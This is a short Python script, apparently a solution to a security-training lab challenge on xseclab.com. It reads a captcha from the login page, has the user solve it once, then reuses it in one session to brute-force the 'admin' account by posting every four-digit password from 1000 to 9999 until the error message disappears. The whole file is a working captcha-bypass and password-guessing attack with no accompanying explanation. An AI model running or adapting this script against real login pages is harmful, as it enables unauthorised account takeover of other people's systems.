import requests
import re
from PIL import Image

captcha = ''
url = 'http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/index.php'
headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
    'Content-Type': 'application/x-www-form-urlencoded',
}
login_url = 'http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php'

def main():
    s = requests.session()
    html = s.get(url).text
    img_url = re.findall('<img src="(.*?)">', html)
    with open('./captcha.jpg', 'wb') as f:
        f.write(requests.get(img_url[0]).content)
        f.close()
    try:
        im = Image.open('./captcha.jpg')
        im.show()
        im.close()
    except IOError:
        print('NO CAPTCHA IMAGE')
        return False
    captcha = input('captcha:')
    data = {
        'username': 'admin',
        'pwd': 1000,
        'submit': 'submit',
        'vcode': captcha
    }
    for i in range(1000,10000):
        data['pwd'] = i
        html = s.post(login_url, data = data).text
        print(i)
        if 'error' not in html:            
            print(html)
            break
if __name__ == '__main__':
    main()
